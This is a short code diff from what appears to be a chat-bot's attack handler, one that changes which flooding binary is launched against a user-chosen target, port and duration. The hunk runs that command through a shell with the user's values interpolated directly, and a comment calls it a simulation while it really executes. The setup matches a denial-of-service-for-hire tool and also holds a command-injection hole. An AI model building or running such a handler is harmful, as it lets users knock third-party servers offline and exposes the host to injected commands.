@@ -300,7 +300,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack  process
-                    full_command = f"./vpsbest {target} {port} {time} {12} {900}"
+                    full_command = f"./raja {target} {port} {time} {900} {1200}"
                     subprocess.run(full_command, shell=True)
 
                     response = " **attack  completed successfully feedback doo**."
